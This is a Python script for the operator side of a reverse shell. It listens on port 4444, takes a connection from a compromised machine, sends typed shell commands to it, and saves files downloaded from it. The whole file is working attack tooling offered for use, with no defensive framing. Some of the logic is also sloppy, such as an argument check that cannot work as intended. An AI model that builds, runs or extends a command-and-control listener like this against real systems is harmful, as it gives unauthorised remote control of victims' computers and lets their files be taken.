import socket
import json
import os


class Listener:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.bind((ip, port))
        listener.listen(5)
        print("# Listening for stuff.")
        self.target, self.connection = listener.accept()

    def run(self):
        while True:
            command = input(f"me@{self.connection[0]}>> ")
            output = self.execute_remotely(command=command)
            print(output)

    def execute_remotely(self, command):
        self.reliable_send(command)
        command_split = command.split()
        if command_split[0] == "quit":
            self.target.close()
            exit()
        elif command_split[0] == "download" and command_split[1] is not None:
            # write a file
            receive = self.reliable_receive()
            file_name = os.path.basename(command_split[1])
            with open(file_name, 'wb') as file:
                file.write(receive.encode())
                file.close()
                return f"File saved {file_name}"
        else:
            receive = self.reliable_receive()
            return receive

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.target.send(json_data.encode())

    def reliable_receive(self):
        data = ''
        while True:
            try:
                data = data + self.target.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue


client = Listener('0.0.0.0', 4444)
client.run()